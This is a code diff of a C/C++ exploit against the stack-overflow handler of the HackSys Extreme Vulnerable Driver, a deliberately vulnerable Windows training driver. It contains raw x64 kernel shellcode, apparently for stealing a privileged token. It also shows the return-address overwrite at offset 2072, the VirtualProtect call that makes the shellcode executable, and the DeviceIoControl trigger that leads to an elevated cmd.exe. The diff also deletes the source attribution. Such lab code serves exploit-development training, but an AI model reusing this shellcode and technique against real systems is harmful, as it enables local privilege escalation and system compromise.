@@ -4,7 +4,6 @@
 
 #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
 /*
-adapted from: https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/
 push r9
 push r8
 push rax
@@ -45,7 +44,7 @@ ret
 
 
 */
-char buffer[] = {
+char shellcode[] = {
 	0xcc,
  0x41, 0x51, 0x41, 0x50, 0x50, 0x51, 0x52, 0x65, 0x4C, 0x8B, 0x0C, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4D, 0x8B, 0x89, 0x20, 0x02, 0x00, 0x00, 0x4D, 0x8B, 0x81, 0xE8, 0x03, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x48, 0x8B, 0x80, 0xF0, 0x02, 0x00, 0x00, 0x48, 0x2D, 0xF0, 0x02, 0x00, 0x00, 0x4C, 0x39, 0x80, 0xE8, 0x02, 0x00, 0x00, 0x75, 0xEA, 0x48, 0x89, 0xC1, 0x48, 0x81, 0xC1, 0x60, 0x03, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x48, 0x8B, 0x80, 0xF0, 0x02, 0x00, 0x00, 0x48, 0x2D, 0xF0, 0x02, 0x00, 0x00, 0x80,0xb8,0xe8,0x02,0x00,0x00,0x4,
  0x75, 0xea, 0x48, 0x8b, 0xd0, 0x48, 0x81, 0xC2, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x12, 
@@ -56,14 +55,14 @@ char buffer[] = {
 void exploit(void) {
 	HANDLE driverHandle;
 	DWORD oldProtect;
+	// ret is overwritten after offset 2072
 	char exploit[2072 + 8];
 
-	printf("[*] Preparing our exploit buffer\n");
-	// Fill our exploit buffer with 'A'
+	printf("[*] Preparing our exploit shellcode\n");
 	memset(exploit, 0x41, 2072);
 
 	// Add our RIP address
-	*(unsigned long long*)(exploit + 2072) = (unsigned long long)buffer;
+	*(unsigned long long*)(exploit + 2072) = (unsigned long long)shellcode;
 
 	printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
 	driverHandle = CreateFileA(
@@ -81,13 +80,11 @@ void exploit(void) {
 		return;
 	}
 
-	printf("[*] Making our shellcode memory at %p RWE\n", buffer);
-	if (!VirtualProtect(buffer, sizeof(buffer), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+	printf("[*] Making our shellcode memory at %p RWE\n", shellcode);
+	if (!VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
 		puts("VirtualProtect error\n");
 	}
 
-	puts("waiting...");
-	std::cin.get();
 	if (!DeviceIoControl(driverHandle, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, (void *)exploit, sizeof(exploit), NULL, 0, NULL, NULL)) {
 		printf("[!] FATAL: Error sending IOCTL to driver\n");
 		return;
@@ -99,6 +96,6 @@ void exploit(void) {
 int main()
 {
 	exploit();
-	system("cmd.exe /c cmd.exe /K cd C:\\");
+	system("cmd.exe");
 	return 0;
 }
